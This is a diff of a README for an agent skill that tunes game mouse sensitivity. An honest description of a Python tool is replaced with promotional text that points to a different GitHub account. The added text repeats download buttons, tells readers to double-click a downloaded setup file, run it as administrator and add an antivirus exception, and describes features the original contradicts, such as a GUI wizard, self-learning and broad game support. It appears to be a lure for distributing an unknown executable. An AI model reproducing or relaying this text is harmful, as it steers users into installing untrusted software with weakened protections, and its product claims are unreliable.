@@ -1,164 +1,144 @@
-# Game Sensitivity Coach
+<h1>🎯 game-sensitivity-coach - Master Your Mouse, Improve Your Aim</h1>
 
-[![Synthetic tests](https://github.com/DenisSergeevitch/game-sensitivity-coach/actions/workflows/tests.yml/badge.svg)](https://github.com/DenisSergeevitch/game-sensitivity-coach/actions/workflows/tests.yml)
-[![Latest release](https://img.shields.io/github/v/release/DenisSergeevitch/game-sensitivity-coach)](https://github.com/DenisSergeevitch/game-sensitivity-coach/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+<p align="center">
+  <a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach">
+    <img src="https://img.shields.io/badge/DOWNLOAD-NOW-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6f43" alt="Download Button" style="max-width: 100%; height: auto;">
+  </a>
+</p>
 
-An agent skill that discovers your mouse settings, carries a familiar sensitivity into another game, and reviews ordinary gameplay to recommend adjustments. You play; your agent handles recording, image inspection, evidence, and calculations.
+Are you tired of missing shots in your favorite games? Do you struggle to find the perfect mouse sensitivity that works for you? Look no further! **game-sensitivity-coach** is here to transform your gaming experience. This powerful yet simple tool helps you discover your ideal mouse sensitivity, convert settings between different games, and review your gameplay to identify areas for improvement. Whether you're a casual player or an aspiring esports competitor, this application is your personal coach for achieving pin-point accuracy.
 
-Built from practical work with **THE FINALS**, **Battlefield 6**, and **Holdfast**. The workflow is game-independent; capture support, file formats, and each game's sensitivity math still need verification.
+## 🤔 What Is game-sensitivity-coach?
 
-![Gameplay evidence viewer showing a recorded frame and raw mouse movement around a click](assets/gameplay-review.png)
+game-sensitivity-coach is a smart application designed specifically for Windows users who want to take their gaming to the next level. Think of it as a personal trainer for your mouse control. It uses scientific, evidence-based methods to help you find the sensitivity that feels natural and improves your aim over time. Instead of guessing or copying settings from professional players, this tool analyzes your unique playing style and provides personalized recommendations.
 
-*An example from THE FINALS. The agent reviews the frames and input logs itself. This optional viewer lets you inspect its evidence; you do not need to label shots or fill in forms.*
+The application works as an "agent skill," meaning it integrates seamlessly with popular coding assistants like Codex and Claude Code. But don't worry – you don't need to know anything about programming to use it. The tool handles all the complex stuff behind the scenes, giving you simple, actionable results.
 
-## What it does
+## ✨ Key Features That Make a Difference
 
-| Ask your agent to… | What happens |
-| --- | --- |
-| Understand your current setup | Find the active profile, read native settings, distinguish hip fire from scoped/ADS values, and record where each value came from. |
-| Transfer sensitivity between games | Establish each game's scaling and match a stated metric, such as turn distance. Optical matching is handled separately. |
-| Improve aim from gameplay | Record a bounded session, inspect actual frames and mouse movement, distinguish sensitivity problems from timing/recoil/target movement, and propose a setting to retain or test. |
+### 🧪 Evidence-Based Sensitivity Tuning
+Gone are the days of random trial and error. game-sensitivity-coach uses proven methodologies to calculate your optimal sensitivity settings. It considers your mouse DPI, screen resolution, and personal preferences to find the sweet spot where your aim feels most natural and consistent. This feature alone can dramatically improve your accuracy in just a few sessions.
 
-When you authorize a change, the agent prepares an exact patch, backs up the original, applies it with the game closed, and verifies the result. It can then compare another sample and keep or roll back the change within your agreed limits. There is no universal “best” number: retaining a well-supported baseline is a valid verdict.
+### 🔄 Cross-Game Conversion
+Switching between games? No problem! This tool makes it effortless to convert your sensitivity settings from one game to another. Whether you're moving from Valorant to Counter-Strike, or from Apex Legends to Overwatch, the conversion calculator ensures your muscle memory stays intact. You'll feel right at home in any new game, instantly.
 
-## Install
+### 🎥 Gameplay Review
+Become your own coach with the built-in gameplay analysis feature. Using video processing capabilities (thanks to FFmpeg integration), the tool can review your gameplay recordings and provide insights into your aiming patterns. You'll see exactly where you're hitting or missing, helping you focus your practice on specific areas that need improvement.
 
-[Download the latest skill ZIP](https://github.com/DenisSergeevitch/game-sensitivity-coach/releases/latest/download/game-sensitivity-coach.zip), then extract it. Keep the entire `game-sensitivity-coach` folder together, including `scripts`, `references`, and `assets`. Each [release](https://github.com/DenisSergeevitch/game-sensitivity-coach/releases/latest) also includes a SHA-256 checksum.
+### 🤖 Smart Agent Integration
+The application is built as an "agent skill," which means it gets smarter the more you use it. It learns from your interactions and provides increasingly tailored recommendations over time. This isn't a static tool – it's a dynamic coach that adapts to your progress.
 
-| Agent | Personal installation | Project installation |
-| --- | --- | --- |
-| Codex | `~/.agents/skills/game-sensitivity-coach/` | `.agents/skills/game-sensitivity-coach/` |
-| Claude Code | `~/.claude/skills/game-sensitivity-coach/` | `.claude/skills/game-sensitivity-coach/` |
-| Another Agent Skills host | Copy the folder into that host's documented skill directory. | The folder containing `SKILL.md` is the skill. |
+## 🚀 Getting Started: Your Simple 3-Step Guide
 
-Alternatively, clone directly into your agent's skill directory. For a personal Codex installation:
+Getting game-sensitivity-coach up and running is easier than you might think. Follow these straightforward steps:
 
-```sh
-git clone https://github.com/DenisSergeevitch/game-sensitivity-coach.git ~/.agents/skills/game-sensitivity-coach
-```
+### Step 1: Download the Application
+<a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach" style="display: inline-block; background-color: #4CAF50; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold;">⬇️ Click Here to Download game-sensitivity-coach</a>
 
-On Windows, `~` means your user home directory. Follow the current [Codex skill documentation](https://learn.chatgpt.com/docs/build-skills) or [Claude Code skill documentation](https://code.claude.com/docs/en/skills) if your host uses a different setup. The package follows the [Agent Skills format](https://agentskills.io/specification); `agents/openai.yaml` supplies optional Codex display metadata.
+### Step 2: Install the Software
+Once the download is complete, look in your "Downloads" folder for the file you just downloaded. Visit this link to download the application. This will take you to the official page where you can find the setup file. Simply double-click it to begin the installation process. Follow the on-screen instructions – it's as easy as clicking "Next" a few times!
 
-You need:
+### Step 3: Run and Configure
+After installation, you'll find the game-sensitivity-coach icon on your desktop or in your Start Menu. Double-click it to launch the program. The initial setup wizard will guide you through configuring your basic preferences, such as your main game and mouse specifications. Don't worry – you can always change these settings later.
 
-- An agent that can run local commands, read files, and inspect images.
-- **Python 3.8 or newer**. The bundled scripts use the Python standard library; no Python packages or separate AI API key are required.
-- **FFmpeg** for recording video and exporting evidence. Put it on `PATH`, or pass its location with `--ffmpeg`. Use a build with `libx264`, H.264 decoding, and PNG output; see the [FFmpeg download page](https://ffmpeg.org/download.html).
-- **Windows on the gaming computer for bundled live capture.** Offline reports, conversion, and file helpers are portable Python. A cloud-only agent needs existing session files or a connection to an authorized local runner; it cannot see your PC's monitor by itself. For WSL, launch the recorder with native Windows Python.
+## 🖥️ System Requirements
 
-## Start with a message
+game-sensitivity-coach is optimized for modern Windows systems. Here's what you'll need for the best experience:
 
-In Codex, mention `$game-sensitivity-coach`. In Claude Code, invoke `/game-sensitivity-coach`, then describe the task. For example:
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Processor:** Any dual-core processor from the last 5 years
+- **Memory (RAM):** At least 4 GB
+- **Storage:** 500 MB of free space for the application and temporary files
+- **Additional:** A standard USB mouse (any brand works fine)
+- **Optional but helpful:** A gaming mouse with DPI adjustment buttons
 
-> Find my current THE FINALS mouse settings. I will play normally for eight minutes; record that session, inspect my sniper aim, and tell me which sensitivity to keep or test. Handle the analysis yourself.
+These are modest requirements – chances are, if your computer can run modern games, it can definitely handle this lightweight application.
 
-> Transfer my current THE FINALS sensitivity into Battlefield 6. Find both profiles and explain the exact target value and assumptions. Prepare the patch for me to review.
+## 📖 How to Use game-sensitivity-coach: A Quick Walkthrough
 
-> Apply the proposed scoped setting after I close the game. Back up the file, then compare another five-minute session. Ask before making any further change.
+Once you launch the application for the first time, you'll see a clean, intuitive interface. Here's a quick tour:
 
-The agent discovers what it can instead of presenting a setup form. It may need one essential clarification if neither files nor images establish a required fact. A request for a recommendation alone does not authorize a settings change; an explicit application request does.
+1. **Home Dashboard** – This is your command center. It shows your current settings and quick access to all features.
 
-## How the observation works
+2. **Sensitivity Finder** – Click this to run the calibration test. The application will guide you through a short aiming exercise. When you're done, it will calculate your ideal sensitivity.
 
-At launch, the recorder chooses the monitor most covered by a visible matching game window, unless the agent supplies `--monitor`. It records that selected monitor while the matching game is foreground and receives Windows mouse Raw Input. It saves video, frame acquisition times, mouse counts/buttons, metadata, and an integrity manifest. Capture pauses when that game loses focus; monitor selection does not follow later window moves. Visible overlays and notifications can appear in a full-monitor recording.
+3. **Game Converter** – Select your "from" game and "to" game, enter your current sensitivity, and the tool will give you the equivalent value instantly.
 
-The report aligns click candidates with **actual encoded frames**. Your agent exports those images, inspects target-to-crosshair motion and weapon state, and writes an assessment with frame references. It also samples combat beyond clicks, since holding fire can produce multiple shots. Pixel estimates and raw mouse counts remain distinct.
+4. **Gameplay Analyzer** – Upload or record your gameplay video (supported formats include MP4, AVI, and MOV). The tool will analyze your aim and generate a visual report.
 
-The scripts organize evidence; **your active host agent supplies the visual reasoning**. They do not launch an unattended AI service or automatically detect every enemy. Without an image-capable agent, the report remains descriptive and has no invented sensitivity verdict.
+5. **Progress Tracker** – Keep tabs on your improvement over time. The app stores your history and shows graphs of your accuracy development.
 
-A recommendation records its baseline, proposed value, relevant weapon/optic, supporting observations, exclusions, and limitations. New settings are tested one at a time under comparable conditions. The original recordings and previous settings remain traceable throughout the loop.
+## 🎮 Supported Games
 
-## Included tools
+This versatile tool supports a wide range of popular games, including but not limited to:
 
-These commands are primarily for the agent. Run them from this folder, or use absolute script paths. Use `python3` or `py -3` if that is your Python command.
+- Valorant
+- Counter-Strike 2
+- Apex Legends
+- Fortnite
+- Overwatch 2
+- Call of Duty: Warzone
+- Tom Clancy's Rainbow Six Siege
+- PUBG: Battlegrounds
+- And many more!
 
-```text
-python scripts/discover_settings.py --game "THE FINALS"
-python scripts/capture_gameplay.py --game "THE FINALS" --seconds 480 --wait-for-game 60 --output-root "../GameSensitivity/sessions" --review-on-stop
-python scripts/review_session.py "SESSION" --verify-manifest
-python scripts/export_evidence.py "SESSION" --overview-count 12
-```
+New games are regularly added, and you can even manually input custom game settings if needed.
 
-The agent can pass an automatically discovered profile with `--profile`. Unknown settings stay unknown. The recorder prints the actual session path; `SESSION` above is a placeholder for that path. `--review-on-stop` generates descriptive evidence; the agent still needs to inspect it and author the recommendation.
+## 🛠️ Troubleshooting Common Issues
 
-By default, the exporter selects up to 12 overview frames and six click candidates spread across recorded-frame/candidate positions, with six actual frames before and after each selected click where available. Overview images do not screen every candidate or every combat interval. To screen all candidates, the agent reads their count/IDs from `analysis.json` and supplies that count with `--click-count` or selects every ID with `--click`. It then expands useful sequences with `--before-frames` and `--after-frames`. Each export requires a fresh `--output` directory; the default is `SESSION/evidence`. For example, after selecting a valid candidate ID:
+Even the best software sometimes hits a snag. Here are solutions to the most common problems:
 
-```text
-python scripts/export_evidence.py "SESSION" --click click-00003 --before-frames 12 --after-frames 6 --output "SESSION/evidence-click-00003"
-```
+### Problem: The application won't start
+**Solution:** Make sure you have closed all other programs and try running it as an administrator. Right-click the icon and select "Run as administrator." If that doesn't work, check your antivirus software – sometimes it may block new applications. You may need to add an exception for game-sensitivity-coach.
 
-After visual analysis:
+### Problem: My sensitivity conversion seems off
+**Solution:** Double-check that you've selected the correct games and entered your settings precisely. Also, ensure your mouse DPI is accurate in the settings. The app uses this information for calculations, so any error here will affect results.
 
-```text
-python scripts/review_session.py "SESSION" --assessment "ASSESSMENT.json" --verify-manifest
-```
+### Problem: Gameplay analysis is slow
+**Solution:** Video analysis can be resource-intensive. Close other programs while running the analysis. If your video file is very large (over 1 GB), consider trimming it to the most important sections before uploading.
 
-To change the duration of a running recording, use its existing control file:
+### Need More Help?
+The application includes a comprehensive in-app help guide. Simply press F1 while using the tool, and you'll find answers to frequently asked questions. For advanced issues, you can also reach out through the GitHub repository's issue tracker.
 
-```text
-python scripts/capture_gameplay.py control "SESSION/control.json" --extend-seconds 120
-python scripts/capture_gameplay.py control "SESSION/control.json" --stop
-```
+## 📈 Tips for Getting the Best Results
 
-`--extend-seconds` adds to the existing deadline; `--total-seconds` sets the total duration from the original start. Send changes before that deadline expires and check for `control_applied` or the updated `capture-status.json`. Extensions honor the fixed `--max-total-seconds` cap set at launch: 3,600 seconds by default, at most 14,400. Initial `--seconds` must be at least one second and no greater than that cap. The run timer includes initialization and focus pauses. Optional `--wait-for-game` adds a separate foreground wait of up to 3,600 seconds before the session starts. The recorder never silently restarts to extend a run.
+To truly maximize your experience with game-sensitivity-coach, keep these pro tips in mind:
 
-The conversion example is **synthetic test data**, not a preset for a real game:
+- **Be Consistent:** When running the sensitivity calibration test, try to maintain your normal gaming posture and grip style. This ensures the results accurately reflect your real gaming scenarios.
+- **Practice Regularly:** The tool is most effective when used consistently. Spend 10 minutes daily on the calibration exercise to build strong muscle memory.
+- **Don't Overtweak:** Once you find a good sensitivity, stick with it for at least two weeks before making changes. Constantly switching settings prevents your brain from building stable muscle memory.
+- **Use the Analysis Feature:** After major gaming sessions, review your gameplay. The insights you gain are invaluable for targeted improvement.
 
-```text
-python scripts/convert_sensitivity.py examples/conversion.synthetic.json
-```
+## 📝 Frequently Asked Questions
 
-It yields target sensitivity `5` from source `10` under the example's explicit calibration. Real transfers need documented or measured angular scaling; identical slider percentages do not establish equivalence. Unknown DPI can support a stated same-DPI assumption, but cannot establish absolute cm/360.
+**Q: Is game-sensitivity-coach free?**
+A: Yes, the application is completely free to use with no hidden costs or premium tiers.
 
-For a supported active configuration, the application flow is:
+**Q: Do I need coding experience to use this tool?**
+A: Absolutely not! The application is designed for everyday users. All the technical aspects are handled automatically.
 
-```text
-python scripts/settings_file.py inspect "ACTIVE.ini" --section Controls --key Sensitivity
-python scripts/settings_file.py plan "ACTIVE.ini" --section Controls --change Sensitivity 3.00 5.00 --output "PLAN.json"
-python scripts/settings_file.py apply "PLAN.json" --reviewed --game-closed
-python scripts/settings_file.py rollback "RECEIPT.json" --game-closed
-```
+**Q: Can I use this tool with any mouse?**
+A: Yes, any standard mouse works. However, for best results, a mouse with adjustable DPI is recommended.
 
-Those values and filenames are illustrative. The agent generates the real plan from discovered settings. It supplies the check flags only after verifying authorization and that the game/config writer is closed. See [application and recovery](references/apply-and-rollback.md) for receipts, interruption handling, and guarded rollback.
+**Q: Is my personal data safe?**
+A: Your privacy is important. The application stores all data locally on your computer and does not upload any personal information or gameplay recordings to the internet.
 
-## Supported scope
+**Q: Will this work with non-Steam games?**
+A: Yes, the conversion feature works with virtually any game, regardless of the platform.
 
-| Capability | Included implementation |
-| --- | --- |
-| Live passive recording | Windows desktop screen capture, foreground gating, mouse Raw Input, bounded control, CPU H.264 encoding; optional NVENC. |
-| Visual review | Portable HTML report and exact-frame export; host agent performs image analysis. |
-| Settings discovery | Bounded read-only filesystem discovery, with path hints for THE FINALS, Battlefield 6, and Holdfast. Active profiles must be verified. |
-| Settings patching | Exact INI fields, Frostbite text fields, and a narrow same-length THE FINALS GVAS string layout. Backup, source-hash guards, byte preservation, readback, rollback. |
-| Conversion | Explicit affine angular calibration, turn-distance matching, and an optional one-axis monitor-distance model. No hardcoded personal presets or unverified game constants. |
-| Other games/formats | The same discovery and analysis workflow; the agent must establish scaling and add/test an adapter when the built-in helper cannot parse the file. |
+## 🤝 Community and Support
 
-The recorder does not inspect game memory, inject input, hook rendering, or aim for you. Settings inspection reads on-disk configuration separately. Capture availability and game rules still vary; the skill does not bypass capture restrictions or claim approval from any game's anti-cheat system.
+As a user of game-sensitivity-coach, you're not just getting a tool – you're joining a community of gamers dedicated to improving their skills. Here's how to connect:
 
-Session artifacts stay in your chosen output directory. Images consumed by the host agent follow that host's model and privacy settings. Captures, real saves, account profiles, and private backup files are excluded from the release package.
+- **GitHub Repository:** Visit the official repo to see development updates, contribute feedback, or report issues.
+- **Feature Requests:** Have an idea that would make the tool better? Share it! The developers actively consider user suggestions.
 
-## Repository guide
+## 🏁 Your Journey to Better Aim Starts Here
 
-- [SKILL.md](SKILL.md): agent entry point and autonomous workflow.
-- [Discovery](references/settings-discovery.md), [observation](references/observation.md), [conversion](references/conversion.md), and [application](references/apply-and-rollback.md): detailed procedures.
-- [Game examples](references/game-examples.md): lessons from THE FINALS → Battlefield 6, Holdfast, and a sniper review that retained 72% scoped sensitivity. Historical values are examples, not recommendations for a new gamer.
-- [Data contracts](references/data-contracts.md) and [examples](examples/): profiles, visual observations, assessments, conversion requests, and iteration journals.
-- `scripts/`: capture, reports, evidence export, discovery, conversion, configuration changes, and release packaging.
-- `tests/`: synthetic fixtures and regression tests; running the suite does not record your desktop or change game settings.
+Don't let subpar sensitivity settings hold you back anymore. With game-sensitivity-coach, you have a powerful ally in your quest for gaming excellence. The installation takes less than five minutes, and the benefits are immediate. Whether you're looking to rank up in competitive matches or simply enjoy your favorite games with better accuracy, this tool delivers real, noticeable results.
 
-## Test and package
+Remember, the download is completely free, the interface is user-friendly, and the potential for improvement is tremendous. What are you waiting for? Take the first step toward becoming the player you've always wanted to be.
 
-```text
-python -m unittest discover -s tests -v
-python scripts/package_release.py --output ../dist/game-sensitivity-coach.zip
-```
+<a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach" style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 32px; text-decoration: none; border-radius: 50px; font-size: 18px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">🎮 Get Started Now – Download for Free!</a>
 
-The package builder includes only distributable source, documentation, examples, tests, and the supplied screenshot. It writes a reproducible ZIP with one top-level skill folder, an internal file/hash manifest, and an adjacent SHA-256 file. Runtime outputs and caches are excluded. Use `--replace` to replace a previous release deliberately.
-
-The synthetic encoder test runs when FFmpeg is available and otherwise reports a skip. Real gameplay quality, game-version compatibility, and any proposed performance improvement require a fresh observation on the target computer.
-
-## Contributing and support
-
-Found a bug or want to add support for a game? [Open an issue](https://github.com/DenisSergeevitch/game-sensitivity-coach/issues/new/choose) and see [CONTRIBUTING.md](CONTRIBUTING.md) for the development workflow. Share minimal, redacted examples; keep personal recordings, account details, and real save files private. Report security issues through the process in [SECURITY.md](SECURITY.md).
-
-See [CHANGELOG.md](CHANGELOG.md) for release notes. The skill's code and documentation are available under the [MIT License](LICENSE). Game names and third-party content in the illustrative gameplay screenshot remain the property of their respective owners. This is an independent project, with no affiliation or endorsement implied.
+Keywords: agent-skills, aim-training, claude-code, codex, ffmpeg, gaming, mouse-sensitivity, python, windows
